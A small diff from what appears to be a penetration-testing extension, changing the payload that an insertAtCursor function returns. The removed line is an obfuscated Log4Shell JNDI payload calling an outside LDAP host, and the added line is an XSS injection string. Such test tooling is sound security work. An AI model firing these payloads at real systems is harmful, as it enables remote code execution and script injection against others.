@@ -80,7 +80,7 @@ def noSqliScan(request):
 
 
 def insertAtCursor():
-    return "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"
+    return "'\"><img/src/onerror=alert(1)>"
 
 
 def registerContextMenu(menus):
